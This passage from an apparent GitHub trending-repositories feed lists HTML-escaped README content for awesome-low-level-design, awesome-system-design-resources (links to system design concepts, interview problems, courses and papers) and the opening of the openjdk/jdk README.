 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/ashishps1/awesome-low-level-design/main/problems/cricinfo.md"&gt;Design CricInfo&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/ashishps1/awesome-low-level-design/main/problems/splitwise.md"&gt;Design Splitwise&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/ashishps1/awesome-low-level-design/main/problems/chess-game.md"&gt;Design Chess Game&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/ashishps1/awesome-low-level-design/main/problems/snake-and-ladder.md"&gt;Design a Snake and Ladder game&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/ashishps1/awesome-low-level-design/main/problems/ride-sharing-service.md"&gt;Design Ride-Sharing Service like Uber&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/ashishps1/awesome-low-level-design/main/problems/course-registration-system.md"&gt;Design Course Registration System&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/ashishps1/awesome-low-level-design/main/problems/movie-ticket-booking-system.md"&gt;Design Movie Ticket Booking System&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/ashishps1/awesome-low-level-design/main/problems/online-shopping-service.md"&gt;Design Online Shopping System like Amazon&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/ashishps1/awesome-low-level-design/main/problems/online-stock-brokerage-system.md"&gt;Design Online Stock Brokerage System&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/ashishps1/awesome-low-level-design/main/problems/music-streaming-service.md"&gt;Design Music Streaming Service like Spotify&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/ashishps1/awesome-low-level-design/main/problems/food-delivery-service.md"&gt;Design Online Food Delivery Service like Swiggy&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;📇 Courses&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://algomaster.io/learn/lld/what-is-lld"&gt;Master LLD Interviews - AlgoMaster.io&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;📚 Books&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://www.amazon.in/dp/9385889753"&gt;Head First Design Patterns&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.amazon.in/dp/B001GSTOAM"&gt;Clean Code&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.amazon.in/dp/0134757599"&gt;Refactoring: Improving the Design of Existing Code&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;📩 Newsletter&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/"&gt;AlgoMaster Newsletter&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Additional resources&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://www.coursera.org/learn/object-oriented-design"&gt;Coursera - Object-Oriented Design&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.coursera.org/learn/design-patterns"&gt;Coursera - Design Patterns&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/DovAmir/awesome-design-patterns"&gt;Github - Awesome Design Patterns&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;🤝 Contributing&lt;/h2&gt; 
&lt;p&gt;Contributions are welcome! If you'd like to add a new problem, improve existing content, or fix errors:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;Fork the repository&lt;/li&gt; 
 &lt;li&gt;Create a feature branch: &lt;code&gt;git checkout -b feature/your-feature-name&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;Commit your changes: &lt;code&gt;git commit -m 'Add some feature'&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;Push to the branch: &lt;code&gt;git push origin feature/your-feature-name&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;Submit a pull request&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;Please make sure to update Readme files and documentation as appropriate.&lt;/p&gt; 
&lt;hr /&gt; 
&lt;p align="center"&gt; &lt;i&gt;If you find this resource helpful, please give it a star and share it with others!&lt;/i&gt; &lt;/p&gt;</description>
    </item>
    
    <item>
      <title>ashishps1/awesome-system-design-resources</title>
      <link>https://github.com/ashishps1/awesome-system-design-resources</link>
      <description>&lt;p&gt;Learn System Design concepts and prepare for interviews using free resources.&lt;/p&gt;&lt;hr&gt;&lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/ashishps1/awesome-system-design-resources/main/diagrams/system-design-github-logo.png" width="350" height="200" /&gt; &lt;/p&gt; 
&lt;p&gt;This repository contains free resources to learn System Design concepts and prepare for interviews.&lt;/p&gt; 
&lt;p&gt;👉 Subscribe to my &lt;a href="https://bit.ly/amghsd"&gt;AlgoMaster Newsletter&lt;/a&gt; and get a &lt;strong&gt;FREE System Design Interview Handbook&lt;/strong&gt; in your inbox.&lt;/p&gt; 
&lt;p&gt;✅ If you are new to System Design, start here: &lt;a href="https://blog.algomaster.io/p/30-system-design-concepts"&gt;System Design was HARD until I Learned these 30 Concepts&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;📌 System Design Key Concepts&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/scalability"&gt;Scalability&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/system-design-what-is-availability"&gt;Availability&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/cap-theorem-explained"&gt;CAP Theorem&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/what-are-acid-transactions-in-databases"&gt;ACID Transactions&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/consistent-hashing-explained"&gt;Consistent Hashing&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/rate-limiting-algorithms-explained-with-code"&gt;Rate Limiting&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/system-design-how-to-avoid-single-point-of-failures"&gt;SPOF&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.cockroachlabs.com/blog/what-is-fault-tolerance/"&gt;Fault Tolerance&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://medium.com/@sourabhatta1819/consensus-in-distributed-system-ac79f8ba2b8c"&gt;Consensus Algorithms&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="http://highscalability.com/blog/2023/7/16/gossip-protocol-explained.html"&gt;Gossip Protocol&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/service-discovery-in-distributed-systems"&gt;Service Discovery&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://abdulrwahab.medium.com/api-architecture-best-practices-for-designing-rest-apis-bf907025f5f"&gt;API Design&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://cloud.google.com/learn/what-is-disaster-recovery"&gt;Disaster Recovery&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.dynatrace.com/news/blog/what-is-distributed-tracing/"&gt;Distributed Tracing&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;🛠️ System Design Building Blocks&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/whats-an-api"&gt;APIs&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/content-delivery-networks"&gt;Content Delivery Network (CDN)&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/proxy-vs-reverse-proxy-explained"&gt;Proxy vs Reverse Proxy&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.cloudflare.com/learning/dns/what-is-dns/"&gt;Domain Name System (DNS)&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/4d7d6f8a-6803-4c7b-85ca-864c87c2cbf2"&gt;Caching&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/top-5-caching-strategies-explained"&gt;Caching Strategies&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/distributed-caching"&gt;Distributed Caching&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/what-is-an-api-gateway"&gt;API Gateway&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/load-balancing-algorithms-explained-with-code"&gt;Load Balancing&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/15-types-of-databases"&gt;Databases Types&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/sql-vs-nosql-7-key-differences"&gt;SQL vs NoSQL&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/a-detailed-guide-on-database-indexes"&gt;Database Indexes&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://systemdesign.one/consistency-patterns/"&gt;Consistency Patterns&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/heartbeats-in-distributed-systems"&gt;HeartBeats&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://medium.com/geekculture/design-patterns-for-microservices-circuit-breaker-pattern-276249ffab33"&gt;Circuit Breaker&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/idempotency-in-distributed-systems"&gt;Idempotency&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/system-design-how-to-scale-a-database"&gt;Database Scaling&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://redis.com/blog/what-is-data-replication/"&gt;Data Replication&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/489440f1-9c80-4241-9ec8-de156964c3b9"&gt;Data Redundancy&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/what-is-database-sharding"&gt;Database Sharding&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.mongodb.com/developer/products/mongodb/active-active-application-architectures/"&gt;Database Architectures&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.druva.com/glossary/what-is-a-failover-definition-and-related-faqs"&gt;Failover&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/bloom-filters"&gt;Bloom Filters&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/message-queues"&gt;Message Queues&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/websockets"&gt;WebSockets&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/what-are-checksums"&gt;Checksums&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://newsletter.systemdesign.one/p/netflix-microservices"&gt;Microservices Guidelines&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://martin.kleppmann.com/2016/02/08/how-to-do-distributed-locking.html"&gt;Distributed Locking&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;⚖️ System Design Tradeoffs&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/system-design-top-15-trade-offs"&gt;Top 15 Tradeoffs&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/system-design-vertical-vs-horizontal-scaling"&gt;Vertical vs Horizontal Scaling&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/concurrency-vs-parallelism"&gt;Concurrency vs Parallelism&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/long-polling-vs-websockets"&gt;Long Polling vs WebSockets&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/batch-processing-vs-stream-processing"&gt;Batch vs Stream Processing&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/stateful-vs-stateless-architecture"&gt;Stateful vs Stateless Design&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/strong-vs-eventual-consistency"&gt;Strong vs Eventual Consistency&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/59cae60d-9717-4e20-a59e-759e370db4e5"&gt;Read-Through vs Write-Through Cache&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/af5fe2fe-9a4f-4708-af43-184945a243af"&gt;Push vs Pull Architecture&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/106604fb-b746-41de-88fb-60e932b2ff68"&gt;REST vs RPC&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/aec1cebf-6060-45a7-8e00-47364ca70761"&gt;Synchronous vs. asynchronous communications&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://aws.amazon.com/compare/the-difference-between-throughput-and-latency/"&gt;Latency vs Throughput&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;🖇️ System Design Architectural Patterns&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/client-server-architecture-explained"&gt;Client-Server Architecture&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://medium.com/hashmapinc/the-what-why-and-how-of-a-microservices-architecture-4179579423a9"&gt;Microservices Architecture&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/2edeb23b-cfa5-4b24-845e-3f6f7a39d162"&gt;Serverless Architecture&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.confluent.io/learn/event-driven-architecture/"&gt;Event-Driven Architecture&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.spiceworks.com/tech/networking/articles/what-is-peer-to-peer/"&gt;Peer-to-Peer (P2P) Architecture&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;✅ &lt;a href="https://blog.algomaster.io/p/how-to-answer-a-system-design-interview-problem"&gt;How to Answer a System Design Interview Problem&lt;/a&gt;&lt;/h2&gt; 
&lt;h2&gt;💻 System Design Interview Problems&lt;/h2&gt; 
&lt;h3&gt;Easy&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/design-a-url-shortener"&gt;Design URL Shortener like TinyURL&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=8zX0rue2Hic"&gt;Design Content Delivery Network (CDN)&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=NtMvNh0WFVM"&gt;Design Parking Garage&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=D0kDMUgo27c"&gt;Design Vending Machine&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=rnZmdmlR-2M"&gt;Design Distributed Key-Value Store&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=iuqZvajTOyA"&gt;Design Distributed Cache&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=uj_4vxm9u90"&gt;Design Authentication System&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=QpLy0_c_RXk"&gt;Design Unified Payments Interface (UPI)&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Medium&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/design-a-chat-application-like-whatsapp"&gt;Design WhatsApp&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/design-spotify-system-design-interview"&gt;Design Spotify&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/design-a-distributed-job-scheduler"&gt;Design Distributed Job Scheduler&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/p/design-a-scalable-notification-service"&gt;Design a Scalable Notification Service&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=VJpfO6KdyWE"&gt;Design Instagram&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=tndzLznxq40"&gt;Design Tinder&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=9-hjBGxuiEs"&gt;Design Facebook&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=wYk0xPP_P_8"&gt;Design Twitter&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=KYExYE_9nIY"&gt;Design Reddit&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=psQzyFfsUGU"&gt;Design Netflix&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=jPKTo1iGQiE"&gt;Design Youtube&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=CeGtqouT8eA"&gt;Design Google Search&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=EpASu_1dUdE"&gt;Design E-commerce Store like Amazon&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=Z-0g_aJL5Fw"&gt;Design TikTok&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=lEL4F_0J3l8"&gt;Design Shopify&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=YyOXt2MEkv4"&gt;Design Airbnb&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=us0qySiUsGU"&gt;Design Autocomplete for Search Engines&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=mhUQe4BKZXs"&gt;Design Rate Limiter&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=iJLL-KPqBpM"&gt;Design Distributed Message Queue like Kafka&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=qsGcfVGvFSs"&gt;Design Flight Booking System&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=07jkn4jUtso"&gt;Design Online Code Editor&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=dUMWMZmMsVE"&gt;Design Stock Exchange System&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=kIcq1_pBQSY"&gt;Design an Analytics Platform (Metrics &amp;amp; Logging)&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=olfaBgJrUBI"&gt;Design Payment System&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=4ijjIUeq6hE"&gt;Design a Digital Wallet&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Hard&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=M4lR_Va97cQ"&gt;Design Location Based Service like Yelp&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=umWABit-wbk"&gt;Design Uber&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=iRhSAR3ldTw"&gt;Design Food Delivery App like Doordash&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=2auwirNBvGg"&gt;Design Google Docs&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=jk3yvVfNvds"&gt;Design Google Maps&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=G32ThJakeHk"&gt;Design Zoom&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://systemdesign.one/distributed-counter-system-design/"&gt;Design Distributed Counter&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=U0xTu6E2CT8"&gt;Design File Sharing System like Dropbox&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=lBAwJgoO3Ek"&gt;Design Ticket Booking System like BookMyShow&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=BKZxZwUgL3Y"&gt;Design Distributed Web Crawler&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=q0KGYwNbf-0"&gt;Design Code Deployment System&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=UmWtcgC96X8"&gt;Design Distributed Cloud Storage like S3&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/watch?v=v7x75aN9liM"&gt;Design Distributed Locking Service&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://systemdesign.one/slack-architecture/"&gt;Design Slack&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://systemdesign.one/live-comment-system-design/"&gt;Design Live Comments&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;📇 Courses&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://algomaster.io/learn/system-design/what-is-system-design"&gt;Learn System Design - AlgoMaster.io&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;📚 Books&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://www.amazon.in/dp/9352135245"&gt;Designing Data-Intensive Applications&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;📩 Newsletters&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://blog.algomaster.io/"&gt;AlgoMaster Newsletter&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;📺 YouTube Channels&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/@TechDummiesNarendraL"&gt;Tech Dummies Narendra L&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/@gkcs"&gt;Gaurav Sen&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/@codeKarle"&gt;codeKarle&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/@ByteByteGo"&gt;ByteByteGo&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/@SystemDesignInterview"&gt;System Design Interview&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/@sudocode"&gt;sudoCODE&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.youtube.com/@SuccessinTech/videos"&gt;Success in Tech&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;📜 Must-Read Engineering Articles&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://discord.com/blog/how-discord-stores-trillions-of-messages"&gt;How Discord stores trillions of messages&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://netflixtechblog.com/building-in-video-search-936766f0017c"&gt;Building In-Video Search at Netflix&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.canva.dev/blog/engineering/from-zero-to-50-million-uploads-per-day-scaling-media-at-canva/"&gt;How Canva scaled Media uploads from Zero to 50 Million per Day&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://medium.com/airbnb-engineering/avoiding-double-payments-in-a-distributed-payments-system-2981f6b070bb"&gt;How Airbnb avoids double payments in a Distributed Payments System&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://stripe.com/blog/payment-api-design"&gt;Stripe’s payments APIs - The first 10 years&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://slack.engineering/real-time-messaging/"&gt;Real time messaging at Slack&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;🗞️ Must-Read Distributed Systems Papers&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://lamport.azurewebsites.net/pubs/lamport-paxos.pdf"&gt;Paxos: The Part-Time Parliament&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://research.google.com/archive/mapreduce-osdi04.pdf"&gt;MapReduce: Simplified Data Processing on Large Clusters&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://static.googleusercontent.com/media/research.google.com/en//archive/gfs-sosp2003.pdf"&gt;The Google File System&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.allthingsdistributed.com/files/amazon-dynamo-sosp2007.pdf"&gt;Dynamo: Amazon’s Highly Available Key-value Store&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://notes.stephenholiday.com/Kafka.pdf"&gt;Kafka: a Distributed Messaging System for Log Processing&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://static.googleusercontent.com/media/research.google.com/en//archive/spanner-osdi2012.pdf"&gt;Spanner: Google’s Globally-Distributed Database&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://static.googleusercontent.com/media/research.google.com/en//archive/bigtable-osdi06.pdf"&gt;Bigtable: A Distributed Storage System for Structured Data&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.usenix.org/legacy/event/usenix10/tech/full_papers/Hunt.pdf"&gt;ZooKeeper: Wait-free coordination for Internet-scale systems&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://www.cs.umb.edu/~poneil/lsmtree.pdf"&gt;The Log-Structured Merge-Tree (LSM-Tree)&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://static.googleusercontent.com/media/research.google.com/en//archive/chubby-osdi06.pdf"&gt;The Chubby lock service for loosely-coupled distributed systems&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;hr /&gt; 
&lt;p align="center"&gt; &lt;i&gt;If you find this resource helpful, please give it a star ⭐️ and share it with others!&lt;/i&gt; &lt;/p&gt;</description>
    </item>
    
    <item>
      <title>openjdk/jdk</title>
      <link>https://github.com/openjdk/jdk</link>
      <description>&lt;p&gt;JDK main-line development https://openjdk.org/projects/jdk&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Welcome to the JDK!&lt;/h1&gt; 
&lt;p&gt;For build instructions please see the &lt;a href="https://openjdk.org/groups/build/doc/building.html"&gt;online documentation&lt;/a&gt;, or either of these files:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/openjdk/jdk/master/doc/building.html"&gt;doc/building.html&lt;/a&gt; (html version)&lt;/li&gt; 
